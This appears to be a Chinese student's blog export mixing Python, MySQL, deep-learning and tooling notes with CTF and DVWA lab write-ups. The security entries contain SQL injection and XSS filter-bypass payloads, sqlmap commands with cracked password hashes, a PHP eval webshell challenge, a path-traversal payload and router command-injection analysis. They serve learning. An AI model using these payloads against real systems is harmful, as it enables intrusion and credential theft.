结果如下： 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese 第一个kind参数就是第一个字符串，之后arguments相当于一个接收了一个list，keywords接收了一个dict 解包参数列表 比如这个栗子： 12args = [3,6]list(range(*args)) 输出的结果就是 [3,4,5] 也就是说我们可以通过*运算符来对一个list进行解包并将其作为参数传递 匿名函数lambda 12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sort方法有两个参数，一个是指定待排序的关键字，一个是reversed，其中key用一个匿名函数进行指定，有一点函数式编程的味道]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探寻数据库]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysql命令行操作小结 感觉这些知识又快忘记了 登陆 mysql -u root -p 创建数据库 create database databasename 删除数据库 drop database databasename 从外部sql文件导入，如果sql文件中没有创建数据库需要先指定一个数据库然后source path/*.sql就可以导入了，再也不用受烦人的phpmyadmin影响了 删除数据表drop table table_name 导出表mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt 导出数据库mysqldump -u root -p RUNOOB &gt; database_dump.txt 备份所有数据库mysqldump -u root -p --all-databases &gt; database_dump.txt 一般sql文件的写法： 123456789drop database if exists DBName;creat database DBName;use DBName;#开始创建表create ......#开始插入数据insert.... 使用pymysql连接数据库 1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() 那个cursor函数我也不是很明白为什么，不过一般的用法就是这样啦 php连接数据库 使用php连接数据库,创建数据库，然后删除 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "连接成功";//查询数据$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("查询数据失败！");&#125;echo "创建成功";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); 遇到了问题： 查了一下stackoverflow 看到了这个回答： The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; 原来是建立过程中的不稳定，怪不得我新建的数据库没有被删掉. 参考 stackoverflow的回答 pymysql文档，写的很简单]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9 第一次接触到这个题目，被惊呆了 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 初看源代码觉得并没有哪里可以让我反序列化注入的地方 但是问题就出在第一句话： ini_set('session.serialize_handler', 'php'); 关键点在于，如果脚本中设置的序列化处理器与php.ini设置的不同，或者两个脚本注册session使用的序列化处理器不同，那么就会出现安全问题。 只需要加一个|就行 这道jarvisOj题目就是这个原题 这里还用到了另外一个漏洞： 自己构造一个网页如下： 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 然后在上传一个文件，本地抓包，这里遇到了一点小问题，就是没办法抓到本地的包，可以通过直接对局域网的网络连接进行设置即可. 此时就可以看到了 接下来继续利用 tql。。。 有趣的php反序列化总结 szfszf jarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
    <content type="text"><![CDATA[感知机补充 接着写 感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$ 我们简要地看一下一次训练的结果： bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 进行很多次训练之后画出的图形： 预测的还是挺准确的 为什么需要bias？ 概念上很好理解，bias就是将一个正比例函数变为了一次函数，这样不必每次都过原点，分类的准确性也就大大地提高了 多层感知机 一层的感知机是没办法处理异或问题的 所以需要增加隐藏层 就像下面这样： 这样就可以做到了： 感觉MLP的数学知识太过复杂了，暂时放着 keras 从栗子代码开始： 12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''使用add来堆叠模型'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''使用compile来配置学习过程'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train 和 y_train 是 Numpy 数组 -- 就像在 Scikit-Learn API 中一样。model.fit(x_train, y_train, epochs=5, batch_size=32)'''评估模型'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequential compile 在训练模型之前，需要配置学习过程，compile接收三个参数 优化器optimizer 损失函数loss 评估标准metrics 一个个来看 优化器 可以先实例化一个优化器对象，然后将它传入model.compile()，或者可以通过 损失函数 损失函数（或称目标函数、优化评分函数）是编译模型时所需的两个参数之一： 1model.compile(loss='mean_squared_error', optimizer='sgd') 我们可以传递一个现有的损失函数名，或者一个tensorflow符号函数，有以下两个参数 y_true: 真实标签. y_pred: 预测值,其shape与y_true相同 可用的损失函数： mean_squared_error mean_absolute_error 等 参考 神经网络中w,b参数的作用（为何需要偏置b的解释） 深度学习中偏移项bias的作用]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning 整理一下上课的笔记，不然全都会忘了去 无监督学习 self organizing map 简称SOM算法 大意：给定一个向量$v_{k}$,寻找到距离最近的神经元 找到最接近的神经元 $$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$ 更新$n_{i}$ wikipedia上一张很形象的图片: 蓝色斑点是训练数据的分布，小白色光盘是从该分布中抽取的当前训练数据。首先（左），SOM节点任意地位于数据空间中。选择最接近训练基准的节点（以黄色突出显示）。它被移向训练数据，因为（在较小程度上）是它在网格上的邻居。在多次迭代之后，网格倾向于近似数据分布（右）。 有监督学习 数学知识 特征向量 线性代数中的特征向量： 对于一个给定的方阵A，它的特征向量v经过线性变化之后，得到的新向量仍然与原来的v保持在同一条直线上，但其长度或方向也许会改变，即： $$Av=\lambda v$$ 此时$v$就是矩阵$A$的特征向量，$\lambda$就是对应的特征值 进一步：在一定条件下，一个变换可以由其特征值特征向量完全表述，也就是说，所有的特征向量组成了这向量空间的一组基底。 一个特征空间是具有相同特征值的特征向量与一个同维数的零向量的集合，比如$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$即为线性变化$A$中以$\lambda$为特征值的特征空间 抽象概念不容易理解，举几个栗子： 恒等变换$I$的特征向量 $$I(v)=v=1\cdot v$$ 可以看到所有的特征向量都是恒等变换$I$的特征向量，恒等变换的特征空间只有一个就是整个空间 类似的，数乘变换$\lambda I$的特征向量也是所有的非零向量，因为按照定义： $$\lambda I(v) = \lambda \cdot v$$ 感知器 看张图： 数学表述为：$t = f(\sum {i=1}^{n} w{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ f函数的表达式： $$f(x) = \left{\begin{matrix} 1 &amp; if , w \cdot x + b &gt; 0 \ 0 &amp; else \end{matrix}\right.$$ $\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$ 如何训练？ 我们来看一个训练与运算的demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' 加载数据，input_data和labels对应 ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' 训练，更新w和b ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' 预测 ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) 我们很惊讶地发现一个如此简单地模型竟然不可思议地完成了这个任务。 数据更新： $w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$ 异或问题 当时老师上课时候提到异或问题是不可解的，后来查了一下资料才明白在神经网络发展的早期，异或问题确实是不可解的，不过通过加入隐藏层使得异或问题能够有了新的解法 如下图： 复习的时候才注意到原来老师提到了通过加入隐藏层的方式来解决异或问题 参考资料 【机器学习】神经网络实现异或（XOR） 1.5 图形化理解神经网络中的异或问题 感知器 wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[从Googlectf一道题认识一下链接文件]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux目录 源自Googlectf2017的一道题 可以通过f参数直接读取到想读的文件 flag藏在 /proc/environ中，怎么才能进入到这个目录？ Linux中有一个叫做symlink method 也就是相当于一个快捷方式，但是却不同于Windows中的shortcut 而正好：/dev/fd这个指向了/proc/self/fd这样payload就不难理解了： /dev/fd/../environ 访问/dev/fd就相当于访问了/proc/self之后回退一次就可以找到environ这个文件了 Linux中 /dev/fd/0运行效果是这样的，相当于你输入啥它就会回答啥 12345 ✘ pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy 接下来了解一下ln命令 软链接：英文symbolic link非常类似于Windows中的快捷方式 硬链接：英文hard link这类文件会拥有自己的inode节点和名称，其inode会指向文件内容所在的数据块emmm后面不是很懂了 建立软链接的方式： ln -s 源文件名称 软链接文件名称 目录和文件均可 现在当前吗目录下创建一个指向/proc/sys的链接 然后我们就可以通过目录遍历来进入到其他的目录了。 软链接还会存在这个问题： 链接的重复定义 这样就不会出问题了，加个-n选项 参考]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode调试php]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[使用vscode调试php代码 下载xdebug 官网 但是需要自己确定php的版本和编译器的版本 但是官网的链接似乎有问题，php5.5的两个反过来了 之后将其添加到php.ini文件中 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 将php添加到环境变量中 这就不细说了 配置vscode中的php路径 在settings.json中指定 调试 踩到的坑 VScode的php debug插件默认是用环境变量中的php来进行调试的，所以php如果没有加入到环境变量中的话是会报错的。 我刚开始用了wampserver的php来进行调试，但是后来失败了，说是没办法加载xdebug插件，所以换成了phpstudy 找不到setting文件？这个坑害惨了 在这个地方需要添加php的路径 两种调试方式，一种是listen for xdebug，需要打开浏览器，另一种是launch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815栈溢出漏洞 屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。 所以这个栈溢出是不存在的 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 缓冲区溢出漏洞 动态调试： 在authenticationcgi_main处下断点 此时返回地址保存在这里： 之后运行到此处： 此时返回地址被覆盖了 继续运行，程序果然崩溃了 进入到函数sub40A424 程序在此时崩溃了 尝试修改password长度 程序还是崩溃了 查看反汇编代码 程序从外部读入CONTENT_LENGTH没有进行任何检查 12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read 计算偏移量； 后面的利用过程感觉比较复杂，没能成功地复现 DIR-645命令执行漏洞 在安全客上看到了一篇分析DIR-645命令执行地文章，随分析一下原理 直接查看servicecgi_main函数 首先会对请求方法进行判断，如果是POST方法则会调用cgibin_parse_request解析参数，具体的实现暂时不考虑，主要是解析CONTENT_TYPE和CONTENT_LENGTH,之后会调用sess_ispoweruser判断是否为合法用户 之后获取 POST 表单字段，若字段名为 EVENT 的话，就将 &quot;event %s &gt; /dev/null&quot; 作为参数执行 lxmldbc_system 函数。 查看lxmldbc_system函数 123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen 主要关注最后两条指令，因为这里用到了MIPS中地分支延迟槽技术，所以$a1传递参数的指令存放在jalr指令之后 故vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4) vsnprintf函数的用法： 函数原型：int vsnprintf(char str, size_t size, const char format,va_list ap); 函数说明：将可变参数格式化输出到一个字符数组 参数：str输出到的数组，size指定大小，防止越界，format格式化参数，ap可变参数列表函数用法 接着调用system函数 12jalr $t9 ; systemmove $a0, $s0 # command 看一下参数的传递过程 $s0本来是栈上的一个变量，vsnprintf将可变参数格式化输出到其中，之后又将其作为参数传递给system函数 相当于执行了 system(&quot;event %s &gt; /dev/null&quot;) 这样就可以想办法进行命令注入了 参考 路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA 用的vulstudy的环境 默认用户名是admin密码是password 需要启动的时候docker-compose up -d就行了 停止的话docker-compose stop停止容器 sql注入 最简单的 没办法是我太菜了，权当复习好了 😢 输入1得到： 123ID: 1First name: adminSurname: admin 然后开始爆字段 1' order by 2 # 确认回显位置： 1' union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 开始爆数据库 1' union select database(),2 # 得到数据库名 123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 开始爆表 表都存在information_schema.tables这里面 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'# 得到： 123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 开始爆字段 然而我并不知道怎么爆字段😞 于是猜测是password 1' union select password,2 from users 得到了： 123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 小白之旅到此结束 升级到medium 改成了post方式提交数据 这时候sqlmap派上用场了 先将抓到的数据包保存为dvwa.txt文件 然后 python sqlmap.py -r &quot;dvwa.txt&quot; --dbs sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema 不过这个payload很神奇 12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit 指定数据库爆表 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables 得到： 123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ 指定表爆字段 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 指定表然后dump数据 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all sqlmap很机智的在破解md5 123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; 得到的表 12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high 这时候就很。。 会弹出一个页面，输入数据之后再跳回来 这就很安全了😛 但是。。 查看源码之后发现： 其实没有任何过滤； 123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); 所以payload照样用，没问题 impossible 这次就更不一般了 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里用到了PDO预编译的方式 那可能就真的没办法了 看了下stackoverflow How can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. 可以有两种方式： 1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; 或者对于mysql来说，可以： 123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDO真的是安全的吗？ Are PDO prepared statements sufficient to prevent SQL injection? SQL injection that gets around mysql_real_escape_string() XSS reflected 第一遍在chrome上试了下&lt;script&gt;alert(1)&lt;/script&gt;没成功 但是看源码： 可能是chrome太安全了吧 换成firefox就没事了 medium 如果看源码就会发现只是简单地对script进行了一次过滤 $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); 那么如何绕过这个限制呢 那就这样构造 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; 就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了 ps. 大小写也可以 high 这次过滤更严格了 $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 最后只留了一个&gt;给你 果然我记得还有img标签也可以造成xss来着 &lt;img src=&quot;aa&quot; onError=alert(123) &gt; 这样就行啦，当然chrome太安全了，还是用firefox吧 impossible 1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; 这种情况下还进行了实体编码，看你怎么绕过 那些年我们没能bypass的xss filter 一篇总结了xss的文章 sql 盲注 从low开始看起， 直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它 mediume 一样的，只是数据包变成了post方式提交的 high 这次sqlmap抽风没跑出来 看下源码好了 本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来 如何盲注？ 一篇文章带你深入理解 SQL 盲注 盲注最常见的一个payload 127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+ 判断数据库中第一个表的第一个字符为否为'P' xss 存储型 还是最简单的low 表单上的name有长度限制，不过这只是前端的限制而已 &lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt; 注入成功 medium 这就很尴尬了。。 原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码： 这里也是通过大小写或者双写就能绕过的 &lt;sCriPt&gt;alert(1)&lt;/script&gt; 找到了一个xss平台 xss平台 但是我发现我不会用了。。]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT 栈溢出笔记]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[MIPS栈溢出 x86和MIPS指令集 在我的理解看来，x86对于栈的操作多了push和pop操作，而MIPS指令集并没有这些，同时两者一个是小端序，一个是大端序，但是不知道为什么，在调试程序的时候依旧用的是小端序emmmm MISP指令集存在栈溢出的原因 叶子函数和非叶子函数 叶子函数的返回地址是直接放在 ra 寄存器中，而非叶子函数需要调用另外的函数，这里的差异就照成了非叶子函数需要把当前的返回地址暂时存放在栈上 实验环境 attifyOS虚拟机，基本内置了我需要的所有工具，当然其中的IDA似乎过期了，去吾爱破解上找了一个Linux版本的IDA安装了 吾爱破解链接 MIPS动态调试 使用qemu-mipsel或者qemu-mipsel-static进行调试，qemu支持使用gdb进行调试，-g选项开启一个端口，IDA可以连接上这个端口从而进行动态调试。之前在看雪的虚拟机上只能用qemu-mipsel-static调试，后来换成了attifyOS发现两者都行。不过如果缺少动态链接库的话还是需要chroot同时将相应的库拷贝过来。 简单的栈溢出 源码： 123456789101112131415#include &lt;stdio.h&gt;void vuln()&#123; system(&quot;/bin/sh&quot;);&#125;void has_stack(char *src)&#123; char dst[20] = &#123;0&#125;; strcpy(dst,src); printf(&quot;copy success!n&quot;);&#125;void main(int argc,char *argv[])&#123; has_stack(argv[1]);&#125; 使用mipsel-linux-gcc进行编译 mipsel-linux-gcc ./stack01.c -o stack01 -static 编译之后得到： root@ubuntu:~/stack# file stack01 stack01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped 使用IDA查看反汇编： 由于main函数中调用了其他的函数，所以main函数必然是非叶子函数，当然这里我们不是覆盖main函数的返回地址，因为has_stack函数也是非叶子函数，而且strcpy没有对长度做限制。 strcpy的第一个参数dst存放在$a0中，第二个参数src存放在$a1中， 123456789.text:00400410 sw $zero, 0x38+var_10($fp).text:00400414 addiu $v0, $fp, 0x38+var_20 #要拷贝到的地方.text:00400418 move $a0, $v0.text:0040041C lw $a1, 0x38+arg_0($fp) # 要拷贝的内容.text:00400420 la $v0, strcpy.text:00400424 move $t9, $v0.text:00400428 jalr $t9 ; strcpy.text:0040042C nop.text:00400430 lw $gp, 0x38+var_28($fp) 偷懒一点不仔细分析栈了 使用patternLocOffset.py工具生成长度为30的字符串 12345/home/oit [oit@ubuntu] [4:31]&gt; python patternOffset.py -c -l 30[*] Create pattern string contains 